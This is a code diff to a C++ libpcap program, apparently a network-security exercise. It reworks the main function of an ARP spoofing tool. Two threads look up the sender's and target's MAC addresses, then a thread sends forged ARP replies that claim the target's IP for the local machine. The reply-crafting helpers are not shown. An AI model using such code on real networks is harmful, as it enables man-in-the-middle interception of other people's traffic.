@@ -1,8 +1,10 @@
 #include <cstdio>
+#include <unistd.h>
+#include <pthread.h>
 #include <pcap.h>
 #include "ethhdr.h"
 #include "arphdr.h"
-#include "arp.h"
+#include "arp_spoof.h"
 
 void usage()
 {
@@ -35,10 +37,47 @@ int main(int argc, char *argv[])
 	Ip sip = Ip(sender_ip);
 	Ip tip = Ip(target_ip);
 
-	smac = get_mac_via_arp(pcap, myMac, myIp, sip);
+	int status;
+
+	ArpReqs SarpReqs = ArpReqs(myMac, smac, myIp, sip);
+	ArpTArgs *SArpTArgs = (ArpTArgs *)malloc(sizeof(ArpTArgs));
+	SArpTArgs->pcap_ = pcap;
+	SArpTArgs->arpReqs_ = SarpReqs;
+	ArpReqs TarpReqs = ArpReqs(myMac, tmac, myIp, tip);
+	ArpTArgs *TArpTArgs = (ArpTArgs *)malloc(sizeof(ArpTArgs));
+	TArpTArgs->pcap_ = pcap;
+	TArpTArgs->arpReqs_ = TarpReqs;
+
+	pthread_t arpReqT[2];
+
+	pthread_create(&arpReqT[0], NULL, t_get_mac_via_arp, (void *)SArpTArgs);
+	pthread_create(&arpReqT[1], NULL, t_get_mac_via_arp, (void *)TArpTArgs);
+
+	for (int i = 0; i < 2; i++)
+		pthread_join(arpReqT[i], (void **)&status);
+	smac = SArpTArgs->retMac_;
+	tmac = TArpTArgs->retMac_;
+
 	printf("sender mac:  %s\n", std::string(smac).c_str());
-	tmac = get_mac_via_arp(pcap, myMac, myIp, tip);
 	printf("target mac:  %s\n", std::string(tmac).c_str());
+
+	ArpReqs arpReqs = ArpReqs(myMac, smac, tip, sip);
+
+	ArpTArgs *arpTArgs = (ArpTArgs *)malloc(sizeof(ArpTArgs));
+	arpTArgs->pcap_ = pcap;
+	arpTArgs->arpReqs_ = arpReqs;
+
+	int thr_id;
+	pthread_t pthread;
+	thr_id = pthread_create(&pthread, NULL, t_send_arp_replys, (void *)arpTArgs);
+	if (thr_id < 0)
+	{
+		perror("pthread0 create error");
+		exit(EXIT_FAILURE);
+	}
+
+	// printf("arpreqs %s\n", std::string(arpReqs.smac_).c_str());
+	pthread_join(pthread, (void **)&status);
 
 	pcap_close(pcap);
 }
